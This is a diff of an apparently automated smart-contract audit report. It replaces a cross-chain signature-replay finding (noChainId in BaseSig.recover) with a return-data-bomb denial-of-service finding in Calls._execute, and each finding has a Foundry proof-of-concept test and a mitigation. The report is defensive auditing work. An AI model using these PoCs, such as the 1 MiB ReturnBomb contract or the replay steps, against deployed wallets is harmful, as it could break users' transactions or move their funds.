@@ -4,169 +4,193 @@
 ##Findings by Pattern
 
 
- **Derived From** : noChainId flag enables cross-chain replay of transaction signatures
+ **Derived From** : Unbounded returndata copy lets callees return-bomb DoS on failure (events/revert)
 
-[M-1]. BaseSig.recover permits chain-agnostic EIP-712 for transactions, enabling cross-chain replay when wallet address matches
+[L-1]. Return-data bomb in Calls._execute lets any callee OOG the wallet on failure handling, breaking batches and DoSing execution
 Finding Status: Valid
-Status Confidence: SomeWhatConfident
-Finding Confidence Justification: Documentation highlights domain-separated, chain-specific signatures as an invariant, but also documents a noChainId mode and recommends chain-agnostic behavior for configuration updates. It is unclear if allowing noChainId for transaction payloads is an intentional feature or an oversight. Given this ambiguity and external deployment/config assumptions (factory address parity across chains), confidence is not maximal.
-Finding Complexity: 6
+Status Confidence: Confident
+Finding Complexity: 5
 Privilege: Permissionless
 
 
 ### Number of Findings
 - C: 0
 - H: 0
-- M: 1
-- L: 0
+- M: 0
+- L: 1
 - I: 0
 
 ##Findings by Pattern
 
 
- **Derived From** : noChainId flag enables cross-chain replay of transaction signatures
+ **Derived From** : Unbounded returndata copy lets callees return-bomb DoS on failure (events/revert)
 
-## [M-1]. BaseSig.recover permits chain-agnostic EIP-712 for transactions, enabling cross-chain replay when wallet address matches
+## [L-1]. Return-data bomb in Calls._execute lets any callee OOG the wallet on failure handling, breaking batches and DoSing execution
 
-### Finding Severity Justification: Setting the noChainId bit in the top-level signature allows hashing transactions with chainId=0, making the EIP-712 digest chain-agnostic. If a wallet address is identical across chains and the nonce on the target chain is unused, a valid transaction signature can be replayed cross-chain, potentially moving real funds. Impact can be large, but exploitation requires external conditions (same wallet address across chains) and the signer intentionally using the noChainId signature type for a transaction. Hence, realistic but conditional: Medium.
+### Finding Severity Justification: Unbounded copying of returndata in Calls._execute via LibOptim.returnData() can cause out-of-gas when a callee returns or reverts with very large returndata, breaking the current batch (even for IGNORE_ERROR) and wasting gas. However, impact is limited to the single transaction; no funds are lost and no persistent state is corrupted. It also requires the wallet owners to include an untrusted/malicious target in their payload, and can be mitigated by specifying per-call gas limits. Therefore this is a gas-grief/availability issue, not an asset-loss bug.
 ## Derived From Pattern/Invariant
-noChainId flag enables cross-chain replay of transaction signatures
+Unbounded returndata copy lets callees return-bomb DoS on failure (events/revert)
 
 ## Exploit Type
-SignatureReplay
+Dos
 
 ## Location
-BaseSig.recover
+Calls._execute
 
 ## Finding Status: Valid
-## Status Confidence: SomeWhatConfident
-### Finding Confidence Justification: Documentation highlights domain-separated, chain-specific signatures as an invariant, but also documents a noChainId mode and recommends chain-agnostic behavior for configuration updates. It is unclear if allowing noChainId for transaction payloads is an intentional feature or an oversight. Given this ambiguity and external deployment/config assumptions (factory address parity across chains), confidence is not maximal.
-### Finding Complexity: 6
+## Status Confidence: Confident
+### Finding Complexity: 5
 ### PoC Test Status: ErrorRunningTests
 ## Minimim Privilege Required:Permissionless
 
 
 ## Description
-BaseSig.recover sets _payload.noChainId for any payload when the top-level signatureFlag has bit 0x02 set, without restricting it to off-chain messages or digests. Consequently, Payload.domainSeparator() binds chainId=0 instead of the current chain for transaction payloads as well. Vulnerable excerpts:
+When an external call fails in Calls._execute, the code copies the full returndata via LibOptim.returnData() and either emits it in CallFailed/CallAborted or bubbles it in a revert. LibOptim.returnData() copies returndatasize() bytes into memory without any cap. A malicious target can revert with very large returndata, causing memory expansion and copy costs to exhaust gas during event emission or revert propagation. This breaks the intended behavior (e.g., IGNORE_ERROR should continue) and DoSes the batch execution. Vulnerable snippet:
 
-In BaseSig.recover():
-  // If the signature type is 10 we do a no chain id signature
-  _payload.noChainId = signatureFlag & 0x02 == 0x02;
-  ...
-  opHash = _payload.hash();
+if (!success) {
+  if (call.behaviorOnError == Payload.BEHAVIOR_IGNORE_ERROR) {
+    errorFlag = true;
+    emit CallFailed(_opHash, i, LibOptim.returnData());
+    continue;
+  }
+  if (call.behaviorOnError == Payload.BEHAVIOR_REVERT_ON_ERROR) {
+    revert Reverted(_decoded, i, LibOptim.returnData());
+  }
+  if (call.behaviorOnError == Payload.BEHAVIOR_ABORT_ON_ERROR) {
+    emit CallAborted(_opHash, i, LibOptim.returnData());
+    break;
+  }
+}
 
-In Payload.domainSeparator():
-  return keccak256(abi.encode(
-    EIP712_DOMAIN_TYPEHASH,
-    EIP712_DOMAIN_NAME_SEQUENCE,
-    EIP712_DOMAIN_VERSION_SEQUENCE,
-    _noChainId ? uint256(0) : uint256(block.chainid),
-    _wallet
-  ));
-
-Because no guard enforces that 'noChainId' remains limited to KIND_MESSAGE/KIND_DIGEST, transaction payloads can be signed with chainId=0. If the wallet address is identical across chains and the nonce on the target chain is still unused, observing a valid signature on chain A allows a permissionless replay on chain B to perform the same wallet action (e.g., token transfer).
+LibOptim.returnData(): copies returndatasize() bytes to memory with no upper bound.
 
 ## Impact
-Cross-chain replay of a signed transaction drains funds on a second chain when the deterministic wallet address matches and the corresponding nonce space is unused on that chain.
+A called contract can deliberately revert with very large returndata so that Calls._execute copies and logs it unbounded via LibOptim.returnData(), exhausting gas during memory expansion and event emission (8 gas/byte). This causes the entire batch to revert even when behaviorOnError=IGNORE_ERROR, breaking intended semantics, wasting gas, and enabling DoS of wallet operations that include untrusted targets. The same pattern exists in Estimator._estimate and Simulator.simulate, so estimation/simulation can also be griefed. There is no direct loss of funds or state corruption, but availability and reliability are significantly impacted.
 
 ## Command to Run Test
 
 
 ## Proof of Concept
-1) Victim signs a transaction payload (KIND_TRANSACTIONS) with a top-level signature flag setting bit 0x02 (noChainId), producing an EIP-712 digest with chainId=0.
-2) Attacker copies the signed calldata from chain A.
-3) On chain B, where the same wallet address exists (deterministic deployment) and the relevant nonce is unused, attacker submits the same payload/signature.
-4) Since the opHash is identical (chainId=0) and verifyingContract is the same, BaseSig.recover validates the signature and the wallet executes the same call(s), transferring funds on chain B.
+Idea: Force the wallet to forward most of its gas to a malicious callee that reverts with a 1 MiB payload. When the wallet handles the failure, it unconditionally copies returndata and emits CallFailed(_opHash, i, bytes), incurring both memory expansion and 8 gas/byte for the log data. With a total gas budget of ~5M, a 1 MiB revert reliably causes OOG during event emission, reverting the whole batch despite behaviorOnError=IGNORE_ERROR.
 
-The following test demonstrates that a transaction signature flagged with noChainId is independent of block.chainid (i.e., chain-agnostic), proving replay feasibility if the wallet address and nonce context permit it.
+Steps:
+1) Deploy ReturnBomb that reverts with exactly 1,048,576 bytes.
+2) Build a payload with two calls: (a) external call to ReturnBomb with behaviorOnError=IGNORE_ERROR and no gasLimit, (b) external call to a Counter.inc() target.
+3) Execute via selfExecute using an external entry that does an external call to self (to satisfy onlySelf). Send ~5,000,000 gas.
+4) The first call fails and the wallet tries to emit CallFailed with the full returndata. Emitting 1 MiB costs >8,388,608 gas for the log data alone, plus memory expansion from LibOptim.returnData(). With only ~5M total gas and some gas already consumed by the callee, this always OOGs within the wallet, reverting the entire batch. The second call is never executed.
 
 ## Proof of Code
-pragma solidity ^0.8.27;
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.28;
 
 import "forge-std/Test.sol";
-import {Payload} from "src/modules/Payload.sol";
-import {BaseSig} from "src/modules/auth/BaseSig.sol";
+import {Calls} from "src/modules/Calls.sol";
 
-contract SigHarness {
-  using Payload for Payload.Decoded;
-
-  function computeDigest(Payload.Decoded memory payload, bool noChainId) external view returns (bytes32) {
-    payload.noChainId = noChainId;
-    return payload.hash();
-  }
-
-  function recoverTx(
-    Payload.Decoded memory payload,
-    bytes calldata signature
-  ) external view returns (uint256 threshold, uint256 weight, bytes32 imageHash, uint256 checkpoint, bytes32 opHash) {
-    return BaseSig.recover(payload, signature, false, address(0));
+// Minimal harness to call selfExecute through an external entry
+contract CallsHarness is Calls {
+  function _isValidImage(bytes32) internal view override returns (bool) { return true; }
+  function _updateImageHash(bytes32) internal override {}
+  // External entry: performs an external call to self to satisfy onlySelf
+  function exec(bytes calldata payload) external {
+    this.selfExecute(payload);
   }
 }
 
-contract NoChainIdReplayTest is Test {
-  using Payload for Payload.Decoded;
+// Malicious callee: revert with a fixed 1 MiB payload
+contract ReturnBomb {
+  // 1,048,576 bytes revert data
+  uint256 internal constant SIZE = 1_048_576;
+  fallback() external payable {
+    assembly {
+      // Revert with SIZE bytes starting at offset 0x00
+      // REVERT will expand memory as needed
+      revert(0x00, SIZE)
+    }
+  }
+}
 
-  SigHarness h;
-  uint256 signerPk;
-  address signer;
+contract Counter {
+  uint256 public n;
+  function inc() external { n++; }
+}
+
+contract ReturnDataBombDeterministicTest is Test {
+  CallsHarness wallet;
+  ReturnBomb bomb;
+  Counter counter;
 
   function setUp() public {
-    h = new SigHarness();
-    signerPk = 0xB0B; // test key
-    signer = vm.addr(signerPk);
+    wallet = new CallsHarness();
+    bomb = new ReturnBomb();
+    counter = new Counter();
   }
 
-  function test_NoChainId_AllowsTxSigCrossChainReplay() public {
-    // Build a minimal transaction payload
-    Payload.Decoded memory p;
-    p.kind = Payload.KIND_TRANSACTIONS;
-    p.space = 0;
-    p.nonce = 0;
-    p.calls = new Payload.Call[](1); // one empty call; defaults are fine for hashing
+  function test_ReturnDataBomb_IgnoreError_revertsBatch() public {
+    // Build packed payload per Payload.fromPackedCalls format.
+    // Global flag: bit0=1 (space=0), nonceSize=0, singleCall=0, countSize=0 => 0x01
+    bytes1 global = 0x01;
+    // call count = 2 (1 byte)
+    bytes1 callCount = 0x02;
 
-    // Compute digest with noChainId=true bound to harness address
-    bytes32 digestNoChain = h.computeDigest(p, true);
+    // Call[0]: external to bomb, no value, no data, no gasLimit, delegate=0, onlyFallback=0, behaviorOnError=IGNORE(00)
+    bytes1 flags0 = 0x00; // will read address
 
-    // Sign digest (EIP-712)
-    (uint8 v, bytes32 r, bytes32 s) = vm.sign(signerPk, digestNoChain);
-    bytes32 yParityAndS = s;
-    if (v == 28) {
-      yParityAndS = bytes32(uint256(s) | (1 << 255));
-    }
+    // Call[1]: external to counter, with data (inc()), default IGNORE behavior
+    bytes1 flags1 = 0x04; // data present
+    bytes memory data1 = abi.encodeWithSelector(Counter.inc.selector);
+    assertEq(data1.length, 4);
 
-    // Top-level signature format:
-    // signatureFlag: 0x02 (noChainId), checkpointSize=0, thresholdSize=1-byte
-    // checkpoint bytes omitted (size=0)
-    // threshold = 1 (1 byte)
-    // branch item: FLAG_SIGNATURE_HASH (0x0) with weight=1 => firstByte = 0x01
-    bytes memory sig = abi.encodePacked(
-      bytes1(0x02),         // signatureFlag: noChainId set
-      bytes1(uint8(0x01)),  // threshold = 1
-      bytes1(uint8(0x01)),  // branch item header: FLAG_SIGNATURE_HASH with weight = 1
-      r,
-      yParityAndS
+    // Encode payload
+    bytes memory payload = abi.encodePacked(
+      global,
+      callCount,
+      // call 0
+      flags0, address(bomb),
+      // call 1
+      flags1, address(counter), bytes3(uint24(data1.length)), data1
     );
 
-    // Recover on current chain
-    (uint256 threshold, uint256 weight, , , bytes32 opHashA) = h.recoverTx(p, sig);
-    assertEq(threshold, 1);
-    assertEq(weight, 1);
-    assertEq(opHashA, digestNoChain);
+    // Execute with ~5M gas to ensure:
+    // - callee can prepare 1 MiB revert data
+    // - wallet OOGs when copying/logging returndata (8 gas/byte + memory expansion)
+    try wallet.exec{gas: 5_000_000}(payload) {
+      fail("expected batch revert from return-data bomb during IGNORE_ERROR handling");
+    } catch {
+      // Expected: entire batch reverts due to OOG in failure handling
+    }
 
-    // Change chain id and recover again: digest remains identical (chain-agnostic)
-    uint256 before = block.chainid;
-    vm.chainId(before + 1);
-    (, , , , bytes32 opHashB) = h.recoverTx(p, sig);
-    assertEq(opHashB, digestNoChain);
-
-    // Restore chain id
-    vm.chainId(before);
+    // The benign second call must not have executed
+    assertEq(counter.n(), 0, "second call executed unexpectedly");
   }
 }
 
 
 ## Suggested Mitigation
-Gate the noChainId flag by payload kind. Only allow _payload.noChainId = true for KIND_MESSAGE and KIND_DIGEST. For transaction payloads (KIND_TRANSACTIONS) and config updates (KIND_CONFIG_UPDATE), ignore bit 0x02 and always bind to the current chainId. Alternatively, add a configurable allowlist that defaults to disallowing chain-agnostic transaction signatures. Example fix: if (_payload.kind != Payload.KIND_MESSAGE && _payload.kind != Payload.KIND_DIGEST) { _payload.noChainId = false; } prior to hashing.
+Fully eliminate the grief vector by bounding returndata copying and avoiding full-bytes logging on failures:
+
+- Add a capped-return helper and use it everywhere returndata is consumed:
+  function returnDataCapped(uint256 max) internal pure returns (bytes memory r) {
+    assembly {
+      let size := returndatasize()
+      if gt(size, max) { size := max }
+      r := mload(0x40)
+      let start := add(r, 32)
+      mstore(0x40, add(start, size))
+      mstore(r, size)
+      returndatacopy(start, 0, size)
+    }
+  }
+
+- In Calls._execute (and Estimator/Simulator):
+  - IGNORE_ERROR and ABORT_ON_ERROR paths: do not emit the full returndata. Either (a) emit a truncated prefix (e.g., first 4–8 KB) via returnDataCapped(MAX_RET_BYTES), or (b) emit a fixed-size hash (keccak256 of returndata) and a length for observability without copying/logging megabytes.
+  - REVERT_ON_ERROR path: revert with a bounded slice (returnDataCapped(MAX_RET_BYTES)) or a standard error plus a hash of the full returndata.
+
+- Pick conservative caps (e.g., MAX_RET_BYTES = 8_192) to bound worst-case gas, and document this behavior.
+
+- Encourage/optionally enforce per-call gasLimit for untrusted targets to further reduce grief surface.
+
+Apply the same truncation policy in Estimator._estimate and Simulator.simulate where LibOptim.returnData() is used.
+
 
 
 
